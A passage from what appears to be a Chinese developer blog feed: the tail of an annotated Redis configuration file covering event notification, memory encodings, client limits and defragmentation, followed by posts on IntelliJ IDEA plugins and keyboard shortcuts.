<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################ LATENCY TRACKING ##############################</span>
<span class="token comment"># Redis扩展延迟监控跟踪每个命令的延迟，并通过“INFO latencystats”命令导出百分比分布，并通过LATENCY命令导出累积延迟分布(直方图)。</span>
<span class="token comment"># 默认情况下，扩展延迟监视是启用的，因为跟踪命令延迟的开销非常小。</span>
<span class="token comment"># latency-tracking yes</span>

<span class="token comment"># 缺省情况下，通过INFO latencystats命令导出的延迟百分比为p50、p99和p999。</span>
<span class="token comment"># latency-tracking-info-percentiles 50 99 99.9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="EVENT-NOTIFICATION：事件通知">EVENT NOTIFICATION：事件通知</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">############################# EVENT NOTIFICATION ##############################</span>
<span class="token comment"># Redis可以通知Pub/Sub客户端在key space中发生的事件。该特性在https://redis.io/topics/notifications上有文档说明</span>
<span class="token comment"># 例如，如果“notify-keyspace-events”通知被启用，并且客户端对存储在数据库0中的KEY“foo”执行DEL操作，则两条消息将通过Pub/Sub发布:</span>
<span class="token comment">#</span>
<span class="token comment"># PUBLISH __keyspace@0__:foo del</span>
<span class="token comment"># PUBLISH __keyevent@0__:del foo</span>
<span class="token comment">#</span>
<span class="token comment"># 可以选择Redis将在一组类中通知的事件。每个类别都由一个单一的字符来标识:</span>
<span class="token comment">#</span>
<span class="token comment">#  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.</span>
<span class="token comment">#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.</span>
<span class="token comment">#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...</span>
<span class="token comment">#  $     String commands</span>
<span class="token comment">#  l     List commands</span>
<span class="token comment">#  s     Set commands</span>
<span class="token comment">#  h     Hash commands</span>
<span class="token comment">#  z     Sorted set commands</span>
<span class="token comment">#  x     Expired events (events generated every time a key expires)</span>
<span class="token comment">#  e     Evicted events (events generated when a key is evicted for maxmemory)</span>
<span class="token comment">#  n     New key events (Note: not included in the 'A' class)</span>
<span class="token comment">#  t     Stream commands</span>
<span class="token comment">#  d     Module key type events</span>
<span class="token comment">#  m     Key-miss events (Note: It is not included in the 'A' class)</span>
<span class="token comment">#  A     Alias for g$lshzxetd, so that the "AKE" string means all the events</span>
<span class="token comment">#        (Except key-miss events which are excluded from 'A' due to their</span>
<span class="token comment">#         unique nature).</span>
<span class="token comment"># </span>
<span class="token comment">#  “notify-keyspace-events” 以一个由零个或多个字符组成的字符串作为参数。空字符串表示禁用通知。</span>
<span class="token comment">#  示例1:要启用列表和通用事件，从事件名称的角度来看，使用: notify-keyspace-events Elg</span>
<span class="token comment">#  示例2: 获取订阅通道名的过期KEY的流 __keyevent@0__:expired 使用: notify-keyspace-events Ex</span>
<span class="token comment">#</span>
<span class="token comment"># 默认情况下，所有通知都是禁用的，因为大多数用户不需要这个功能，而且这个功能有一些开销。注意，如果不指定K或E中的至少一个，则不会传递任何事件。</span>
<span class="token key attr-name">notify-keyspace-events</span> <span class="token value attr-value">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ADVANCED-CONFIG">ADVANCED CONFIG</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">############################### ADVANCED CONFIG ###############################</span>

<span class="token comment"># 当哈希表有少量条目且最大条目不超过给定阈值时，使用内存效率高的数据结构进行编码。</span>
<span class="token comment"># 可以使用以下指令配置这些阈值。</span>
<span class="token key attr-name">hash-max-listpack-entries</span> <span class="token value attr-value">512</span>
<span class="token key attr-name">hash-max-listpack-value</span> <span class="token value attr-value">64</span>

<span class="token comment"># 列表还以一种特殊的方式进行编码，以节省大量空间。</span>
<span class="token comment"># 每个内部列表节点允许的条目数可以指定为固定的最大大小或最大元素数。</span>
<span class="token comment"># 对于固定的最大大小，使用-5到-1，这意味着:</span>
<span class="token comment"># -5: max size: 64 Kb  &lt;-- not recommended for normal workloads</span>
<span class="token comment"># -4: max size: 32 Kb  &lt;-- not recommended</span>
<span class="token comment"># -3: max size: 16 Kb  &lt;-- probably not recommended</span>
<span class="token comment"># -2: max size: 8 Kb   &lt;-- good</span>
<span class="token comment"># -1: max size: 4 Kb   &lt;-- good</span>
<span class="token comment"># 正数意味着每个列表节点存储的元素数量不超过这个数字</span>
<span class="token comment"># 最高性能选项通常是-2 (8 Kb大小)或-1 (4 Kb大小)，但如果您的用例是唯一的，请根据需要调整设置。</span>
<span class="token key attr-name">list-max-listpack-size</span> <span class="token value attr-value">-2</span>

<span class="token comment"># 列表也可以被压缩。</span>
<span class="token comment"># 压缩深度是从列表的两边排除压缩的quicklist ziplist节点的数量。</span>
<span class="token comment"># 列表的头部和尾部总是未压缩，以便进行快速的推送/弹出操作。设置:</span>
<span class="token comment"># 0: 禁用所有列表压缩</span>
<span class="token comment"># 1: depth 1 means "don't start compressing until after 1 node into the list,</span>
<span class="token comment">#    going from either the head or tail"</span>
<span class="token comment">#    So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail]</span>
<span class="token comment">#    [head], [tail] will always be uncompressed; inner nodes will compress.</span>
<span class="token comment"># 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail]</span>
<span class="token comment">#    2 here means: don't compress head or head-&gt;next or tail-&gt;prev or tail,</span>
<span class="token comment">#    but compress all nodes between them.</span>
<span class="token comment"># 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail]</span>
<span class="token comment"># etc.</span>
<span class="token key attr-name">list-compress-depth</span> <span class="token value attr-value">0</span>

<span class="token comment"># 当一个集合只是由基数为10的64位有符号整数范围内的整数组成时，集合具有特殊的编码。</span>
<span class="token comment"># 下面的配置设置设置了集合大小的限制，以便使用这种特殊的内存节省编码。</span>
<span class="token key attr-name">set-max-intset-entries</span> <span class="token value attr-value">512</span>

<span class="token comment"># 包含非整数值的集合，当它们有少量的条目，并且最大的条目不超过给定的阈值时，也使用内存有效的数据结构进行编码。 </span>
<span class="token comment"># 可以使用以下指令配置这些阈值。</span>
<span class="token key attr-name">set-max-listpack-entries</span> <span class="token value attr-value">128</span>
<span class="token key attr-name">set-max-listpack-value</span> <span class="token value attr-value">64</span>

<span class="token comment"># 与哈希和列表类似，排序集也经过特殊编码，以节省大量空间。此编码仅在排序集的长度和元素低于以下限制时使用:</span>
<span class="token key attr-name">zset-max-listpack-entries</span> <span class="token value attr-value">128</span>
<span class="token key attr-name">zset-max-listpack-value</span> <span class="token value attr-value">64</span>

<span class="token comment"># HyperLogLog稀疏表示字节限制。限制包括16字节的报头。当使用稀疏表示的HyperLogLog超过该限制时，将被转换为密集表示。</span>
<span class="token comment"># 大于16000的值是完全无用的，因为此时密集表示的内存效率更高。</span>
<span class="token comment"># 建议值为~ 3000，以获得空间高效编码的好处，而不会降低太多PFADD的速度，使用稀疏编码时PFADD为O(N)。</span>
<span class="token comment"># 当不考虑CPU，但考虑空间，并且数据集由基数在0-15000范围内的许多hyperloglog组成时，该值可以提高到~10000。</span>
<span class="token key attr-name">hll-sparse-max-bytes</span> <span class="token value attr-value">3000</span>


<span class="token comment"># Streams macro node max size / items.</span>
<span class="token comment"># 流数据结构是一个大节点的基树，其中编码多个项。使用此配置，可以配置单个节点的字节大小，以及在添加新流条目时切换到新节点之前可以包含的最大项数。</span>
<span class="token comment"># 如果下列任何设置被设置为0，则该限制将被忽略，因此，例如，可以通过将max-bytes设置为0并将max-entries设置为所需值来设置max-entries限制。</span>
<span class="token key attr-name">stream-node-max-bytes</span> <span class="token value attr-value">4096</span>
<span class="token key attr-name">stream-node-max-entries</span> <span class="token value attr-value">100</span>

<span class="token comment"># 主动rehash每100毫秒使用1毫秒的CPU时间来帮助重哈希主Redis哈希表(将顶级键映射到值的哈希表)。</span>
<span class="token comment"># Redis使用的哈希表实现(参见dicc .c)执行惰性重哈希:你对哈希表执行的操作越多，执行的重哈希“步骤”就越多，所以如果服务器空闲，重哈希永远不会完成，哈希表会占用更多内存。</span>
<span class="token comment">#</span>
<span class="token comment"># 默认情况下，每秒钟使用这个毫秒10次，以便主动重新散列主字典，尽可能释放内存。</span>
<span class="token comment"># 如果不确定:使用“activerehashing no”，如果你有硬延迟要求，在你的环境中，Redis可以不时地以2毫秒的延迟回复查询，这不是一件好事。</span>
<span class="token comment"># 如果你没有这样的硬性要求，但想尽快释放内存，请使用"activerehashing yes"。</span>
<span class="token key attr-name">activerehashing</span> <span class="token value attr-value">yes</span>

<span class="token comment"># 客户端输出缓冲区限制可用于强制断开由于某些原因(常见原因是Pub/Sub客户端消费消息的速度不及发布者生成消息的速度)而未能足够快地从服务器读取数据的客户端。</span>
<span class="token comment"># 可以为三种不同类型的客户端设置不同的限制:</span>
<span class="token comment">#</span>
<span class="token comment"># normal -&gt; normal clients including MONITOR clients</span>
<span class="token comment"># replica -&gt; replica clients</span>
<span class="token comment"># pubsub -&gt; clients subscribed to at least one pubsub channel or pattern</span>
<span class="token comment">#</span>
<span class="token comment"># The syntax of every client-output-buffer-limit directive is the following:</span>
<span class="token comment">#</span>
<span class="token comment"># client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span>
<span class="token comment">#</span>
<span class="token comment"># A client is immediately disconnected once the hard limit is reached, or if</span>
<span class="token comment"># the soft limit is reached and remains reached for the specified number of</span>
<span class="token comment"># seconds (continuously).</span>
<span class="token comment"># So for instance if the hard limit is 32 megabytes and the soft limit is</span>
<span class="token comment"># 16 megabytes / 10 seconds, the client will get disconnected immediately</span>
<span class="token comment"># if the size of the output buffers reach 32 megabytes, but will also get</span>
<span class="token comment"># disconnected if the client reaches 16 megabytes and continuously overcomes</span>
<span class="token comment"># the limit for 10 seconds.</span>
<span class="token comment">#</span>
<span class="token comment"># By default normal clients are not limited because they don't receive data</span>
<span class="token comment"># without asking (in a push way), but just after a request, so only</span>
<span class="token comment"># asynchronous clients may create a scenario where data is requested faster</span>
<span class="token comment"># than it can read.</span>
<span class="token comment">#</span>
<span class="token comment"># Instead there is a default limit for pubsub and replica clients, since</span>
<span class="token comment"># subscribers and replicas receive data in a push fashion.</span>
<span class="token comment">#</span>
<span class="token comment"># Note that it doesn't make sense to set the replica clients output buffer</span>
<span class="token comment"># limit lower than the repl-backlog-size config (partial sync will succeed</span>
<span class="token comment"># and then replica will get disconnected).</span>
<span class="token comment"># Such a configuration is ignored (the size of repl-backlog-size will be used).</span>
<span class="token comment"># This doesn't have memory consumption implications since the replica client</span>
<span class="token comment"># will share the backlog buffers memory.</span>
<span class="token comment">#</span>
<span class="token comment"># Both the hard or the soft limit can be disabled by setting them to zero.</span>
<span class="token key attr-name">client-output-buffer-limit</span> <span class="token value attr-value">normal 0 0 0</span>
<span class="token key attr-name">client-output-buffer-limit</span> <span class="token value attr-value">replica 256mb 64mb 60</span>
<span class="token key attr-name">client-output-buffer-limit</span> <span class="token value attr-value">pubsub 32mb 8mb 60</span>

<span class="token comment"># Client query buffers accumulate new commands. They are limited to a fixed</span>
<span class="token comment"># amount by default in order to avoid that a protocol desynchronization (for</span>
<span class="token comment"># instance due to a bug in the client) will lead to unbound memory usage in</span>
<span class="token comment"># the query buffer. However you can configure it here if you have very special</span>
<span class="token comment"># needs, such us huge multi/exec requests or alike.</span>
<span class="token comment">#</span>
<span class="token comment"># client-query-buffer-limit 1gb</span>

<span class="token comment"># In some scenarios client connections can hog up memory leading to OOM</span>
<span class="token comment"># errors or data eviction. To avoid this we can cap the accumulated memory</span>
<span class="token comment"># used by all client connections (all pubsub and normal clients). Once we</span>
<span class="token comment"># reach that limit connections will be dropped by the server freeing up</span>
<span class="token comment"># memory. The server will attempt to drop the connections using the most </span>
<span class="token comment"># memory first. We call this mechanism "client eviction".</span>
<span class="token comment">#</span>
<span class="token comment"># Client eviction is configured using the maxmemory-clients setting as follows:</span>
<span class="token comment"># 0 - client eviction is disabled (default)</span>
<span class="token comment">#</span>
<span class="token comment"># A memory value can be used for the client eviction threshold,</span>
<span class="token comment"># for example:</span>
<span class="token comment"># maxmemory-clients 1g</span>
<span class="token comment">#</span>
<span class="token comment"># A percentage value (between 1% and 100%) means the client eviction threshold</span>
<span class="token comment"># is based on a percentage of the maxmemory setting. For example to set client</span>
<span class="token comment"># eviction at 5% of maxmemory:</span>
<span class="token comment"># maxmemory-clients 5%</span>

<span class="token comment"># In the Redis protocol, bulk requests, that are, elements representing single</span>
<span class="token comment"># strings, are normally limited to 512 mb. However you can change this limit</span>
<span class="token comment"># here, but must be 1mb or greater</span>
<span class="token comment">#</span>
<span class="token comment"># proto-max-bulk-len 512mb</span>

<span class="token comment"># Redis calls an internal function to perform many background tasks, like</span>
<span class="token comment"># closing connections of clients in timeout, purging expired keys that are</span>
<span class="token comment"># never requested, and so forth.</span>
<span class="token comment">#</span>
<span class="token comment"># Not all tasks are performed with the same frequency, but Redis checks for</span>
<span class="token comment"># tasks to perform according to the specified "hz" value.</span>
<span class="token comment">#</span>
<span class="token comment"># By default "hz" is set to 10. Raising the value will use more CPU when</span>
<span class="token comment"># Redis is idle, but at the same time will make Redis more responsive when</span>
<span class="token comment"># there are many keys expiring at the same time, and timeouts may be</span>
<span class="token comment"># handled with more precision.</span>
<span class="token comment">#</span>
<span class="token comment"># The range is between 1 and 500, however a value over 100 is usually not</span>
<span class="token comment"># a good idea. Most users should use the default of 10 and raise this up to</span>
<span class="token comment"># 100 only in environments where very low latency is required.</span>
<span class="token key attr-name">hz</span> <span class="token value attr-value">10</span>

<span class="token comment"># Normally it is useful to have an HZ value which is proportional to the</span>
<span class="token comment"># number of clients connected. This is useful in order, for instance, to</span>
<span class="token comment"># avoid too many clients are processed for each background task invocation</span>
<span class="token comment"># in order to avoid latency spikes.</span>
<span class="token comment">#</span>
<span class="token comment"># Since the default HZ value by default is conservatively set to 10, Redis</span>
<span class="token comment"># offers, and enables by default, the ability to use an adaptive HZ value</span>
<span class="token comment"># which will temporarily raise when there are many connected clients.</span>
<span class="token comment">#</span>
<span class="token comment"># When dynamic HZ is enabled, the actual configured HZ will be used</span>
<span class="token comment"># as a baseline, but multiples of the configured HZ value will be actually</span>
<span class="token comment"># used as needed once more clients are connected. In this way an idle</span>
<span class="token comment"># instance will use very little CPU time while a busy instance will be</span>
<span class="token comment"># more responsive.</span>
<span class="token key attr-name">dynamic-hz</span> <span class="token value attr-value">yes</span>

<span class="token comment"># When a child rewrites the AOF file, if the following option is enabled</span>
<span class="token comment"># the file will be fsync-ed every 4 MB of data generated. This is useful</span>
<span class="token comment"># in order to commit the file to the disk more incrementally and avoid</span>
<span class="token comment"># big latency spikes.</span>
<span class="token key attr-name">aof-rewrite-incremental-fsync</span> <span class="token value attr-value">yes</span>

<span class="token comment"># When redis saves RDB file, if the following option is enabled</span>
<span class="token comment"># the file will be fsync-ed every 4 MB of data generated. This is useful</span>
<span class="token comment"># in order to commit the file to the disk more incrementally and avoid</span>
<span class="token comment"># big latency spikes.</span>
<span class="token key attr-name">rdb-save-incremental-fsync</span> <span class="token value attr-value">yes</span>

<span class="token comment"># Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good</span>
<span class="token comment"># idea to start with the default settings and only change them after investigating</span>
<span class="token comment"># how to improve the performances and how the keys LFU change over time, which</span>
<span class="token comment"># is possible to inspect via the OBJECT FREQ command.</span>
<span class="token comment">#</span>
<span class="token comment"># There are two tunable parameters in the Redis LFU implementation: the</span>
<span class="token comment"># counter logarithm factor and the counter decay time. It is important to</span>
<span class="token comment"># understand what the two parameters mean before changing them.</span>
<span class="token comment">#</span>
<span class="token comment"># The LFU counter is just 8 bits per key, it's maximum value is 255, so Redis</span>
<span class="token comment"># uses a probabilistic increment with logarithmic behavior. Given the value</span>
<span class="token comment"># of the old counter, when a key is accessed, the counter is incremented in</span>
<span class="token comment"># this way:</span>
<span class="token comment">#</span>
<span class="token comment"># 1. A random number R between 0 and 1 is extracted.</span>
<span class="token comment"># 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1).</span>
<span class="token comment"># 3. The counter is incremented only if R &lt; P.</span>
<span class="token comment">#</span>
<span class="token comment"># The default lfu-log-factor is 10. This is a table of how the frequency</span>
<span class="token comment"># counter changes with a different number of accesses with different</span>
<span class="token comment"># logarithmic factors:</span>
<span class="token comment">#</span>
<span class="token comment"># +--------+------------+------------+------------+------------+------------+</span>
<span class="token comment"># | factor | 100 hits   | 1000 hits  | 100K hits  | 1M hits    | 10M hits   |</span>
<span class="token comment"># +--------+------------+------------+------------+------------+------------+</span>
<span class="token comment"># | 0      | 104        | 255        | 255        | 255        | 255        |</span>
<span class="token comment"># +--------+------------+------------+------------+------------+------------+</span>
<span class="token comment"># | 1      | 18         | 49         | 255        | 255        | 255        |</span>
<span class="token comment"># +--------+------------+------------+------------+------------+------------+</span>
<span class="token comment"># | 10     | 10         | 18         | 142        | 255        | 255        |</span>
<span class="token comment"># +--------+------------+------------+------------+------------+------------+</span>
<span class="token comment"># | 100    | 8          | 11         | 49         | 143        | 255        |</span>
<span class="token comment"># +--------+------------+------------+------------+------------+------------+</span>
<span class="token comment">#</span>
<span class="token comment"># NOTE: The above table was obtained by running the following commands:</span>
<span class="token comment">#</span>
<span class="token comment">#   redis-benchmark -n 1000000 incr foo</span>
<span class="token comment">#   redis-cli object freq foo</span>
<span class="token comment">#</span>
<span class="token comment"># NOTE 2: The counter initial value is 5 in order to give new objects a chance</span>
<span class="token comment"># to accumulate hits.</span>
<span class="token comment">#</span>
<span class="token comment"># The counter decay time is the time, in minutes, that must elapse in order</span>
<span class="token comment"># for the key counter to be decremented.</span>
<span class="token comment">#</span>
<span class="token comment"># The default value for the lfu-decay-time is 1. A special value of 0 means we</span>
<span class="token comment"># will never decay the counter.</span>
<span class="token comment">#</span>
<span class="token comment"># lfu-log-factor 10</span>
<span class="token comment"># lfu-decay-time 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ACTIVE-DEFRAGMENTATION">ACTIVE DEFRAGMENTATION</h2>
<pre><code class="language-properties">########################### ACTIVE DEFRAGMENTATION #######################
#
# What is active defragmentation?
# -------------------------------
#
# Active (online) defragmentation allows a Redis server to compact the
# spaces left between small allocations and deallocations of data in memory,
# thus allowing to reclaim back memory.
#
# Fragmentation is a natural process that happens with every allocator (but
# less so with Jemalloc, fortunately) and certain workloads. Normally a server
# restart is needed in order to lower the fragmentation, or at least to flush
# away all the data and create it again. However thanks to this feature
# implemented by Oran Agra for Redis 4.0 this process can happen at runtime
# in a "hot" way, while the server is running.
#
# Basically when the fragmentation is over a certain level (see the
# configuration options below) Redis will start to create new copies of the
# values in contiguous memory regions by exploiting certain specific Jemalloc
# features (in order to understand if an allocation is causing fragmentation
# and to allocate it in a better place), and at the same time, will release the
# old copies of the data. This process, repeated incrementally for all the keys
# will cause the fragmentation to drop back to normal values.
#
# Important things to understand:
#
# 1. This feature is disabled by default, and only works if you compiled Redis
#    to use the copy of Jemalloc we ship with the source code of Redis.
#    This is the default with Linux builds.
#
# 2. You never need to enable this feature if you don't have fragmentation
#    issues.
#
# 3. Once you experience fragmentation, you can enable this feature when
#    needed with the command "CONFIG SET activedefrag yes".
#
# The configuration parameters are able to fine tune the behavior of the
# defragmentation process. If you are not sure about what they mean it is
# a good idea to leave the defaults untouched.

# Active defragmentation is disabled by default
# activedefrag no

# Minimum amount of fragmentation waste to start active defrag
# active-defrag-ignore-bytes 100mb

# Minimum percentage of fragmentation to start active defrag
# active-defrag-threshold-lower 10

# Maximum percentage of fragmentation at which we use maximum effort
# active-defrag-threshold-upper 100

# Minimal effort for defrag in CPU percentage, to be used when the lower
# threshold is reached
# active-defrag-cycle-min 1

# Maximal effort for defrag in CPU percentage, to be used when the upper
# threshold is reached
# active-defrag-cycle-max 25

# Maximum number of set/hash/zset/list fields that will be processed from
# the main dictionary scan
# active-defrag-max-scan-fields 1000

# Jemalloc background thread for purging will be enabled by default
jemalloc-bg-thread yes

# It is possible to pin different threads and processes of Redis to specific
# CPUs in your system, in order to maximize the performances of the server.
# This is useful both in order to pin different Redis threads in different
# CPUs, but also in order to make sure that multiple Redis instances running
# in the same host will be pinned to different CPUs.
#
# Normally you can do this using the "taskset" command, however it is also
# possible to this via Redis configuration directly, both in Linux and FreeBSD.
#
# You can pin the server/IO threads, bio threads, aof rewrite child process, and
# the bgsave child process. The syntax to specify the cpu list is the same as
# the taskset command:
#
# Set redis server/io threads to cpu affinity 0,2,4,6:
# server_cpulist 0-7:2
#
# Set bio threads to cpu affinity 1,3:
# bio_cpulist 1,3
#
# Set aof rewrite child process to cpu affinity 8,9,10,11:
# aof_rewrite_cpulist 8-11
#
# Set bgsave child process to cpu affinity 1,10,11
# bgsave_cpulist 1,10-11

# In some cases redis will emit warnings and even refuse to start if it detects
# that the system is in bad state, it is possible to suppress these warnings
# by setting the following config which takes a space delimited list of warnings
# to suppress
#
# ignore-warnings ARM64-COW-BUG
</code></pre>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA插件</title>
    <url>/20221026/ee604b16.html</url>
    <content><![CDATA[<h1>CamelCase</h1>
<p>使用快捷键转换驼峰、下划线等命名规则</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092234688-1671159524636-1.png" alt="image-20211125092234688"></p>
<p>光标放在要修改的名称上（如：变量名，或者mapper.xml里的字段名,会自动识别光标所在单词），按control+alt+U,则进行按命名规则进行转换，会按配置中选择的命名规则列表来回切换。</p>
<p>如图，如果只选择了CamelCase to camelCase、camelCase to snake_case，则可以在两者之间来回切换，适合公司对命名的要求。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092300247-1671159524637-3.png" alt="image-20211125092300247"></p>
<h1>RestfulToolkit</h1>
<!--  API查找工具 --> 
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092703437-1671159524637-9.png" alt="image-20211125092703437"></p>
<h1>Free Mybatis plugin</h1>
<!-- 快速从代码跳转到mapper及从mapper返回代码-->
<h1>EasyCode</h1>
<p>代码生成插件</p>
<ol>
<li>
<p>下载插件，安装后重启</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092413929-1671159524637-5.png" alt="image-20211125092413929"></p>
</li>
<li>
<p>在idea右侧选择Database，选择自己的数据库</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092433296-1671159524637-7.png" alt="image-20211125092433296"></p>
</li>
<li>
<p>输入账号密码，连接成功</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092518334-1671159524637-11.png" alt="image-20211125092518334"></p>
</li>
<li>
<p>选择自己所需的表，鼠标右键-&gt;EasyCode-&gt;Generate Code</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092538684-1671159524637-13.png" alt="image-20211125092538684"></p>
</li>
<li>
<p>选择自己需要生成的，勾选，然后OK就行</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092616622-1671159524637-15.png" alt="image-20211125092616622"></p>
</li>
<li>
<p>系统自己生成了entity包，以及实体类。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125092639951-1671159524637-17.png" alt="image-20211125092639951"></p>
</li>
</ol>
<h1>MybatisLog</h1>
<!-- 程序运行的SQL语句可以直接拷贝运行 -->
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA快捷键</title>
    <url>/20221026/610bdf07.html</url>
    <content><![CDATA[<p>[Toc]</p>
<h1>Editing</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><s>Ctrl + Space</s> Ctrl + ,</td>
<td>Basic code completion (the name of any class, method or variable)</td>
<td>基本代码完成（任何类、方法或变量的名称）</td>
</tr>
<tr>
<td>Ctrl + Shift + Space</td>
<td>Smart code completion (filters the list of methods and variables by expected type)</td>
<td>智能代码完成（按预期类型筛选方法和变量列表）</td>
</tr>
<tr>
<td>Ctrl + Shift + Enter</td>
<td>Complete statement</td>
<td>完整声明</td>
</tr>
<tr>
<td>Ctrl + P</td>
<td>Parameter info (within method call arguments)</td>
<td>调用方法时，列出全部参数信息</td>
</tr>
<tr>
<td>Ctrl + Q</td>
<td>Quick documentation lookup</td>
<td>光标放在类/方法上，快速显示Java doc 信息</td>
</tr>
<tr>
<td>Ctrl +hover</td>
<td>Brief Info</td>
<td>鼠标放到类/方法上，提示基本信息</td>
</tr>
<tr>
<td>Ctrl + F1</td>
<td>Show descriptions of error or warning at caret</td>
<td>显示光标处的错误或警告的处理提示信息</td>
</tr>
<tr>
<td>Alt + Insert</td>
<td>Generate code… (Getters, Setters, Constructors, hashCode/equals, toString)</td>
<td>弹出可生成代码列表（getter、setter、constructor、hashCode/equals、toString）</td>
</tr>
<tr>
<td>Ctrl + O</td>
<td>Override methods</td>
<td>弹出可覆写的方法列表</td>
</tr>
<tr>
<td>Ctrl + I</td>
<td>Implement methods</td>
<td>弹出要实现的方法列表</td>
</tr>
<tr>
<td>Ctrl + Alt + T</td>
<td>Surround with…(if…else,try…catch, for,  synchronized, etc.)</td>
<td>代码块快选（要放在插入点上的代码结束分号上）</td>
</tr>
<tr>
<td>Ctrl + /</td>
<td>Comment/uncomment with line comment</td>
<td>代码行注释</td>
</tr>
<tr>
<td>Ctrl + Shift + /</td>
<td>Comment/uncomment with block comment</td>
<td>代码块注释</td>
</tr>
<tr>
<td>Ctrl + W</td>
<td>Select successively increasing code blocks</td>
<td>选择连续递增的代码块</td>
</tr>
<tr>
<td>Ctrl + Shift + W</td>
<td>Decrease current selection to previous state</td>
<td>取消选择代码块</td>
</tr>
<tr>
<td>Alt + Enter</td>
<td>Show intention actions and quick-fixes</td>
<td>展示意图行动<br>快速修复</td>
</tr>
<tr>
<td>Ctrl + Alt + L</td>
<td>Reformat code</td>
<td>代码格式化</td>
</tr>
<tr>
<td>Ctrl + Alt + O</td>
<td>Optimize imports</td>
<td>优化类的import</td>
</tr>
<tr>
<td>Ctrl + Alt + I</td>
<td>Auto-indent line(s)</td>
<td>自动缩进行</td>
</tr>
<tr>
<td>Tab / Shift + Tab</td>
<td>Indent/unindent selected lines</td>
<td>缩进/取消缩进选定行</td>
</tr>
<tr>
<td>Ctrl+X</td>
<td>Cut current line or selected block to clipboard</td>
<td>将当前行或选定块剪切到剪贴板</td>
</tr>
<tr>
<td>Ctrl+C</td>
<td>Copy current line or selected block to clipboard</td>
<td>将当前行或选定块复制到剪贴板</td>
</tr>
<tr>
<td>Ctrl+V</td>
<td>Paste from clipboard</td>
<td>粘贴</td>
</tr>
<tr>
<td>Ctrl+Shift + V</td>
<td>Paste from recent buffers…</td>
<td>打开剪贴板，选择要粘贴的内容</td>
</tr>
<tr>
<td>Ctrl+D</td>
<td>Duplicate current line or selected block</td>
<td>复制并粘贴当前行或选定块</td>
</tr>
<tr>
<td>Ctrl+Y</td>
<td>Delete line at caret</td>
<td>删除光标处的行</td>
</tr>
<tr>
